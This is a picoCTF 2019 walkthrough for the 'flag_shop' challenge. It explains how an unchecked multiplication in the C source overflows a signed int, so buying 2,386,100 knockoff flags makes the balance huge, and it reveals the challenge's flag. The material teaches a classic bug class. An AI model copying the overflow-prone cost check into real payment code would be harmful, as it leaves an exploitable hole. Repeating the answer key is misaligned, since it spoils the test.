# flag_shop
300 points

### Description
*"There's a flag shop selling stuff, can you buy a flag? Source. Connect with nc 2019shell1.picoctf.com 29250."*

### Solution
Before taking a look at the source code, let's run the netcat command to get a feel for the program:
```
$ nc 2019shell1.picoctf.com 29250
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
 
```

Okay, let's see what each one does, starting with 1:
```
1



 Balance: 1100 


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection

```

We start with a balance of 1100, good to know, what about 2?
```
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag

```
Let's try these sequentially too, starting with 1:
```
1
These knockoff Flags cost 900 each, enter desired quantity

```

We know we can only afford 1 (you can try buying more, but it won't let you spend more than your balance):
```

The final cost is: 900

Your current balance after transaction: 200

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection

```

We are back at the beginning, let's go try to buy the second flag:
```
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1

Not enough funds for transaction
```

At this point we can guess that the flag is in "1337 Flag", but how can we get it? Let's look at that source code now:

```c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    setbuf(stdout, NULL);
    int con;
    con = 0;
    int account_balance = 1100;
    while(con == 0){
        
        printf("Welcome to the flag exchange\n");
        printf("We sell flags\n");

        printf("\n1. Check Account Balance\n");
        printf("\n2. Buy Flags\n");
        printf("\n3. Exit\n");
        int menu;
        printf("\n Enter a menu selection\n");
        fflush(stdin);
        scanf("%d", &menu);
        if(menu == 1){
            printf("\n\n\n Balance: %d \n\n\n", account_balance);
        }
        else if(menu == 2){
            printf("Currently for sale\n");
            printf("1. Defintely not the flag Flag\n");
            printf("2. 1337 Flag\n");
            int auction_choice;
            fflush(stdin);
            scanf("%d", &auction_choice);
            if(auction_choice == 1){
                printf("These knockoff Flags cost 900 each, enter desired quantity\n");
                
                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 900*number_flags; // <--------------------------- INTEGER OVERFLOW VULNERABILITY HERE
                    printf("\nThe final cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds to complete purchase\n");
                    }
                                    
                    
                }
                    
                    
                    
                
            }
            else if(auction_choice == 2){
                printf("1337 flags cost 100000 dollars, and we only have 1 in stock\n");
                printf("Enter 1 to buy one");
                int bid = 0;
                fflush(stdin);
                scanf("%d", &bid);
                
                if(bid == 1){
                    
                    if(account_balance > 100000){
                        FILE *f = fopen("flag.txt", "r");
                        if(f == NULL){

                            printf("flag not found: please run this on the server\n");
                            exit(0);
                        }
                        char buf[64];
                        fgets(buf, 63, f);
                        printf("YOUR FLAG IS: %s\n", buf);
                        }
                    
                    else{
                        printf("\nNot enough funds for transaction\n\n\n");
                    }}

            }
        }
        else{
            con = 1;
        }

    }
    return 0;
}
```

If you look at the line I pointed out in the code, the product of 900 and `number_flags` is saved in `total_cost`. However, signed integers in C can only be 
as large as 2,147,483,647. Any larger than that, and the left-most bit of the memory bits allocated for that integer will become a 1. 

Why is this a problem? Well, modern computers represent numbers using [two's complement](https://en.wikipedia.org/wiki/Two%27s_complement). Without going 
into too much detail, this means that the left-most bit being a 1 signifies that the number is actually *negative*. If you don't know about two's complement, 
you should become familiar with it. It's an extremely important concept related to how computers actually do mathematical operations.

So what happens if we add 1 to an variable of type `int` that holds 2,147,483,647? Well, it actually loops around to the largest (in magnitude) negative number available in C: -2,147,483,648. What if we subtract 1 from this new number? You guessed it, it would become 2,147,483,647.

So how does this help in this problem? Well if we can overflow `total_cost` and make it negative, then we would actually be *adding* to our balance by buying these flags. This technique is known as an [integer overflow](https://en.wikipedia.org/wiki/Integer_overflow).

We need `total_cost` to be greater than 2,147,483,647 so it will become negative. This means buying a number of flags greater than `2,147,483,647 / 900 = 2386092.94111`. To make sure this is large enough, I just rounded the number up to 2,386,100.
```
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2386100

The final cost is: -2147477296

Your current balance after transaction: 2147478396
```

You should be able to buy the second flag now.

<details>
  <summary>Flag:</summary>
  picoCTF{m0n3y_bag5_783740a8}
</details>

[Next Problem](https://github.com/sdvickers98/picoCTF-2019-Walkthrough/blob/master/general_skills/%2315%20-%20flag_shop.md)

[Return to General Skills](https://github.com/sdvickers98/picoCTF-2019-Walkthrough/blob/master/general_skills/%230%20-%20General%20Skills%20Homepage.md)

[Return to Homepage](https://github.com/sdvickers98/picoCTF-2019-Walkthrough)
